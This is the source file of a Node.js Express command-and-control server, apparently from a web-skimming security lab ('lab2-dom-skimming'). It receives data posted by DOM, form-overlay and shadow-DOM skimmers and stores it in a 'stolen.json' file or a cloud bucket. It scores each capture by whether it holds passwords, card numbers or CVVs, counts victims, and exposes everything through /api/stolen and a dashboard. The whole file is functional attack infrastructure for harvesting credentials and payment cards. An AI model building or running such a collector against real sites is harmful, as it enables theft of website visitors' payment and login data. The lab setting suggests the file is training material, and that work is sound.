/**
 * ENHANCED C2 SERVER - Support for both local storage and Cloud Storage
 *
 * Environment Variables:
 * - STORAGE_MODE: 'local' | 'cloud' (default: auto-detect)
 * - C2_STORAGE_BUCKET: Cloud Storage bucket name
 * - LAB_ID: Lab identifier for multi-tenant storage
 * - GOOGLE_CLOUD_PROJECT: GCP project ID
 */

const express = require('express')
const cors = require('cors')
const fs = require('fs')
const path = require('path')

// Conditional Cloud Storage imports
let CloudStorageAdapter, SmartAggregationAdapter
try {
  CloudStorageAdapter = require('./cloud-storage-adapter')
  SmartAggregationAdapter = require('./smart-aggregation-adapter')
} catch (e) {
  // Cloud Storage not available - will use local storage
}

const app = express()
const PORT = process.env.C2_STANDALONE === 'true' ? (process.env.PORT || 8080) : 3000

// Storage mode detection
const STORAGE_MODE = process.env.STORAGE_MODE || detectStorageMode()
const CLOUD_RUN_ENV = process.env.K_SERVICE !== undefined // Detect Cloud Run

function detectStorageMode() {
  // Auto-detect based on environment
  if (CLOUD_RUN_ENV && CloudStorageAdapter) {
    return 'cloud'
  }
  return 'local'
}

// Initialize storage adapter based on mode
let storageAdapter
if (STORAGE_MODE === 'cloud' && SmartAggregationAdapter) {
  storageAdapter = new SmartAggregationAdapter({
    labId: process.env.LAB_ID || 'lab2-dom-skimming',
    bucketName: process.env.C2_STORAGE_BUCKET,
    // Optimized for dashboard performance
    batchWindowMinutes: parseInt(process.env.BATCH_WINDOW_MINUTES) || 60, // 1-hour batches
    cacheTtlMinutes: parseInt(process.env.CACHE_TTL_MINUTES) || 5, // 5-minute cache
    maxBatchSize: parseInt(process.env.MAX_BATCH_SIZE) || 500, // 500 attacks per batch
    logger: {
      log: (msg) => console.log(`[SmartAggregation] ${msg}`),
      error: (msg, err) => console.error(`[SmartAggregation] ${msg}`, err),
      warn: (msg, err) => console.warn(`[SmartAggregation] ${msg}`, err)
    }
  })
  console.log(`[C2-Server] Using Smart Aggregation mode (bucket: ${process.env.C2_STORAGE_BUCKET}, batch window: ${storageAdapter.batchConfig.batchWindowMinutes}min)`)
} else if (STORAGE_MODE === 'cloud' && CloudStorageAdapter) {
  // Fallback to basic cloud storage
  storageAdapter = new CloudStorageAdapter({
    labId: process.env.LAB_ID || 'lab2-dom-skimming',
    bucketName: process.env.C2_STORAGE_BUCKET,
    logger: {
      log: (msg) => console.log(`[CloudStorage] ${msg}`),
      error: (msg, err) => console.error(`[CloudStorage] ${msg}`, err),
      warn: (msg, err) => console.warn(`[CloudStorage] ${msg}`, err)
    }
  })
  console.log(`[C2-Server] Using Basic Cloud Storage mode (bucket: ${process.env.C2_STORAGE_BUCKET})`)
} else {
  // Fallback to local storage
  const DATA_DIR = path.join(__dirname, 'stolen-data')
  const ANALYSIS_DIR = path.join(__dirname, 'analysis')
  const STOLEN_FILE = path.join(DATA_DIR, 'stolen.json')

  // Ensure directories exist
  ;[DATA_DIR, ANALYSIS_DIR].forEach(dir => {
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true })
    }
  })

  console.log(`[C2-Server] Using local storage mode (${CLOUD_RUN_ENV ? 'WARNING: Cloud Run detected but cloud storage not available' : 'container environment'})`)
}

// Middleware
app.use(cors())
app.use(express.json({ limit: '10mb' }))
app.use(express.urlencoded({ extended: true, limit: '10mb' }))

// sendBeacon content-type handler
app.use((req, res, next) => {
  if (req.method === 'POST' && req.is('text/plain') && !req.body) {
    let raw = ''
    req.on('data', chunk => { raw += chunk })
    req.on('end', () => {
      try { req.body = JSON.parse(raw) } catch (_) { req.body = {} }
      next()
    })
  } else {
    next()
  }
})

// Attack statistics tracking
let attackStatistics = {
  totalRequests: 0,
  domMonitorSessions: 0,
  formOverlayCaptures: 0,
  shadowDomCaptures: 0,
  uniqueVictims: new Set(),
  startTime: Date.now(),
  storageMode: STORAGE_MODE
}

/**
 * Storage abstraction layer
 */
async function saveAttackData(attackType, data) {
  if (storageAdapter && STORAGE_MODE === 'cloud') {
    return await storageAdapter.saveAttackData(attackType, data)
  } else {
    return saveAttackDataLocal(attackType, data)
  }
}

function saveAttackDataLocal(attackType, data) {
  const enrichedData = {
    ...data,
    serverTimestamp: Date.now(),
    serverTime: new Date().toISOString(),
    attackType
  }

  let existing = []
  if (fs.existsSync(STOLEN_FILE)) {
    try {
      existing = JSON.parse(fs.readFileSync(STOLEN_FILE, 'utf8'))
      if (!Array.isArray(existing)) existing = []
    } catch (e) {
      console.warn('[LocalStorage] stolen.json corrupt, resetting to empty array')
      existing = []
    }
  }

  existing.push(enrichedData)
  fs.writeFileSync(STOLEN_FILE, JSON.stringify(existing, null, 2))
  console.log('[LocalStorage] Attack data appended to stolen.json')

  return STOLEN_FILE
}

async function getRecentAttacks(count = 100) {
  if (storageAdapter && STORAGE_MODE === 'cloud') {
    return await storageAdapter.getRecentAttacks(count)
  } else {
    return getRecentAttacksLocal()
  }
}

function getRecentAttacksLocal() {
  try {
    if (!fs.existsSync(STOLEN_FILE)) {
      return []
    }
    const data = JSON.parse(fs.readFileSync(STOLEN_FILE, 'utf8'))
    return Array.isArray(data) ? data : []
  } catch (error) {
    console.error('[LocalStorage] Error reading stolen data:', error.message)
    return []
  }
}

async function saveAnalysis(analysis) {
  if (storageAdapter && STORAGE_MODE === 'cloud') {
    return await storageAdapter.saveAnalysis(analysis)
  } else {
    const analysisPath = path.join(ANALYSIS_DIR, `analysis_${Date.now()}.json`)
    fs.writeFileSync(analysisPath, JSON.stringify(analysis, null, 2))
    return analysisPath
  }
}

// Utility functions (keeping existing ones)
function sanitizeForLog(input) {
  if (typeof input !== 'string') input = String(input)
  return input.replace(/[\r\n\t\x00-\x1f\x7f]/g, ' ').substring(0, 500)
}

function logToConsole(level, message, data = null) {
  const timestamp = new Date().toISOString()
  const safeMessage = sanitizeForLog(message)
  const logEntry = `[${timestamp}] [${level.toUpperCase()}] [C2-Server] ${safeMessage}`
  console.log(logEntry)
  if (data) {
    console.log('  Data:', JSON.stringify(data, null, 2))
  }
}

function generateSessionId() {
  return 'session_' + Date.now() + '_' + Math.random().toString(36).substring(2, 11)
}

// Analysis functions (keeping existing logic but making async-compatible)
function analyzeAttackData(data) {
  const analysis = {
    timestamp: Date.now(),
    attackType: data.type || 'unknown',
    severity: 'medium',
    indicators: [],
    riskScore: 0
  }

  switch (data.type) {
    case 'periodic':
    case 'immediate':
    case 'session_end':
    case 'form_submission': // New optimized attack type
      analysis.attackType = 'dom-monitor'
      analysis.severity = assessDomMonitorSeverity(data)
      analysis.indicators = extractDomMonitorIndicators(data)
      break
    case 'form_overlay_capture':
      analysis.attackType = 'form-overlay'
      analysis.severity = assessFormOverlaySeverity(data)
      analysis.indicators = extractFormOverlayIndicators(data)
      break
    case 'shadow_dom_capture':
    case 'shadow_session_end':
      analysis.attackType = 'shadow-dom'
      analysis.severity = assessShadowDomSeverity(data)
      analysis.indicators = extractShadowDomIndicators(data)
      break
  }

  analysis.riskScore = calculateRiskScore(analysis)
  return analysis
}

function assessDomMonitorSeverity(data) {
  // Handle both old periodic format and new form_submission format
  if (data.type === 'form_submission' && data.formData) {
    const fieldCount = Object.keys(data.formData).length
    const highValueFields = Object.values(data.formData).filter(f => f.isHighValue).length

    if (highValueFields > 3 || fieldCount > 8) return 'critical'
    if (highValueFields > 1 || fieldCount > 5) return 'high'
    if (highValueFields > 0 || fieldCount > 2) return 'medium'
  }

  // Legacy format
  if (data.summary) {
    const keystrokeCount = data.summary.keystrokesCount || 0
    const fieldCount = data.summary.fieldsCount || 0
    if (keystrokeCount > 100 || fieldCount > 5) return 'high'
    if (keystrokeCount > 20 || fieldCount > 2) return 'medium'
  }

  return 'low'
}

function extractDomMonitorIndicators(data) {
  const indicators = ['DOM MutationObserver usage', 'Real-time field monitoring']

  if (data.type === 'form_submission') {
    indicators.push('Form submission interception')
    if (data.formStats && data.formStats.highValueFields > 0) {
      indicators.push(`High-value field capture (${data.formStats.highValueFields} fields)`)
    }
  }

  if (data.summary && data.summary.keystrokesCount > 0) {
    indicators.push('Keystroke logging detected')
  }

  return indicators
}

// Keep other analysis functions unchanged...
function assessFormOverlaySeverity(data) {
  if (data.data && data.data.credentials) {
    const credentialFields = Object.keys(data.data.credentials)
    const hasPassword = credentialFields.some(field => field.includes('password'))
    const hasCard = credentialFields.some(field => field.includes('card') || field.includes('cvv'))
    if (hasPassword && hasCard) return 'critical'
    if (hasPassword || hasCard) return 'high'
    if (credentialFields.length > 3) return 'medium'
  }
  return 'low'
}

function assessShadowDomSeverity(data) {
  if (data.sessions) {
    const sessionCount = data.sessions.length
    const hasKeystrokes = data.sessions.some(s => s.capturedKeystrokes && s.capturedKeystrokes.length > 0)
    if (sessionCount > 5 && hasKeystrokes) return 'high'
    if (sessionCount > 2 || hasKeystrokes) return 'medium'
  }
  return 'low'
}

function extractFormOverlayIndicators(data) {
  const indicators = ['Dynamic form overlay injection', 'Credential harvesting']
  if (data.data && data.data.formType) {
    indicators.push(`Target form type: ${data.data.formType}`)
  }
  return indicators
}

function extractShadowDomIndicators(data) {
  const indicators = ['Shadow DOM encapsulation abuse', 'Cross-boundary monitoring']
  if (data.shadowInfo && data.shadowInfo.mode === 'closed') {
    indicators.push('Closed shadow DOM usage')
  }
  return indicators
}

function calculateRiskScore(analysis) {
  let score = 0
  switch (analysis.severity) {
    case 'critical': score += 90; break
    case 'high': score += 70; break
    case 'medium': score += 50; break
    case 'low': score += 20; break
  }
  score += analysis.indicators.length * 5
  return Math.min(score, 100)
}

function updateStatistics(data) {
  attackStatistics.totalRequests++
  const victimId = data.metadata?.userAgent || 'unknown'
  attackStatistics.uniqueVictims.add(victimId)

  switch (data.type) {
    case 'periodic':
    case 'immediate':
    case 'session_end':
    case 'form_submission':
      attackStatistics.domMonitorSessions++
      break
    case 'form_overlay_capture':
      attackStatistics.formOverlayCaptures++
      break
    case 'shadow_dom_capture':
    case 'shadow_session_end':
      attackStatistics.shadowDomCaptures++
      break
  }
}

/**
 * API Endpoints
 */

// Health check endpoint (enhanced for cloud storage)
app.get('/health', async (req, res) => {
  const health = {
    status: 'healthy',
    timestamp: Date.now(),
    storageMode: STORAGE_MODE,
    environment: CLOUD_RUN_ENV ? 'cloud-run' : 'container'
  }

  if (storageAdapter && STORAGE_MODE === 'cloud') {
    try {
      const storageHealth = await storageAdapter.healthCheck()
      health.storage = storageHealth
    } catch (error) {
      health.storage = { status: 'unhealthy', error: error.message }
      health.status = 'degraded'
    }
  }

  res.json(health)
})

// Main data collection endpoint (enhanced for async storage)
app.post('/collect', async (req, res) => {
  try {
    const attackData = req.body
    const clientIp = sanitizeForLog(req.ip || req.connection.remoteAddress || 'unknown')

    logToConsole('info', `Received attack data from ${clientIp}`, {
      type: sanitizeForLog(attackData.type || 'unknown'),
      timestamp: attackData.timestamp,
      size: JSON.stringify(attackData).length,
      storageMode: STORAGE_MODE
    })

    updateStatistics(attackData)
    const analysis = analyzeAttackData(attackData)

    // Save data asynchronously
    const [savedPath] = await Promise.all([
      saveAttackData(analysis.attackType, attackData),
      saveAnalysis(analysis)
    ])

    if (analysis.severity === 'high' || analysis.severity === 'critical') {
      logToConsole('warn', `HIGH SEVERITY ATTACK DETECTED: ${analysis.attackType}`, {
        severity: analysis.severity,
        riskScore: analysis.riskScore,
        indicators: analysis.indicators
      })
    }

    res.json({
      success: true,
      sessionId: generateSessionId(),
      timestamp: Date.now(),
      storageMode: STORAGE_MODE,
      analysis: {
        severity: analysis.severity,
        riskScore: analysis.riskScore
      }
    })
  } catch (error) {
    logToConsole('error', 'Error processing attack data', { error: error.message })
    res.status(500).json({
      success: false,
      error: 'Server error processing data'
    })
  }
})

// Get attack statistics (enhanced for smart aggregation)
app.get('/stats', async (req, res) => {
  try {
    // If using smart aggregation, get optimized stats
    if (storageAdapter && storageAdapter.getStatsSummary) {
      const cloudStats = await storageAdapter.getStatsSummary()

      const stats = {
        ...attackStatistics,
        // Merge with cloud storage stats
        totalRequests: Math.max(attackStatistics.totalRequests, cloudStats.totalAttacks || 0),
        uniqueVictims: Math.max(attackStatistics.uniqueVictims.size, cloudStats.uniqueVictims || 0),
        // Cloud-specific metrics
        cardDataCaptures: cloudStats.cardDataCount || 0,
        formSubmissions: cloudStats.formSubmissionCount || 0,
        activeDays: cloudStats.activeDays || 0,
        lastUpdate: cloudStats.lastUpdate,
        uptime: Date.now() - attackStatistics.startTime,
        uptimeHours: Math.round(((Date.now() - attackStatistics.startTime) / (1000 * 60 * 60)) * 100) / 100,
        storageMode: STORAGE_MODE,
        cacheStatus: 'optimized'
      }

      // Convert Set to number for JSON response
      stats.uniqueVictims = typeof stats.uniqueVictims === 'number' ? stats.uniqueVictims : stats.uniqueVictims.size || 0

      res.json(stats)
    } else {
      // Fallback to in-memory stats
      const stats = {
        ...attackStatistics,
        uniqueVictims: attackStatistics.uniqueVictims.size,
        uptime: Date.now() - attackStatistics.startTime,
        uptimeHours: Math.round(((Date.now() - attackStatistics.startTime) / (1000 * 60 * 60)) * 100) / 100,
        storageMode: STORAGE_MODE,
        cacheStatus: 'in-memory'
      }
      res.json(stats)
    }
  } catch (error) {
    console.error('[C2-Server] Error getting stats:', error.message)
    // Fallback to basic stats on error
    const stats = {
      ...attackStatistics,
      uniqueVictims: attackStatistics.uniqueVictims.size,
      uptime: Date.now() - attackStatistics.startTime,
      uptimeHours: Math.round(((Date.now() - attackStatistics.startTime) / (1000 * 60 * 60)) * 100) / 100,
      storageMode: STORAGE_MODE,
      cacheStatus: 'error',
      error: error.message
    }
    res.json(stats)
  }
})

// Get all stolen data (async-compatible)
app.get('/api/stolen', async (req, res) => {
  try {
    const data = await getRecentAttacks(1000) // Get more for compatibility
    res.json(data)
  } catch (error) {
    logToConsole('error', 'Error fetching stolen data', { error: error.message })
    res.status(500).json({ error: 'Error fetching data' })
  }
})

// Serve dashboard
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'dashboard.html'))
})

// Graceful shutdown handling
process.on('SIGTERM', async () => {
  console.log('[C2-Server] Received SIGTERM, shutting down gracefully...')
  if (storageAdapter && storageAdapter.cleanup) {
    await storageAdapter.cleanup()
  }
  process.exit(0)
})

app.listen(PORT, () => {
  logToConsole('info', `C2 Server running on port ${PORT}`, {
    storageMode: STORAGE_MODE,
    environment: CLOUD_RUN_ENV ? 'cloud-run' : 'container',
    bucket: process.env.C2_STORAGE_BUCKET || 'N/A'
  })
})

module.exports = app
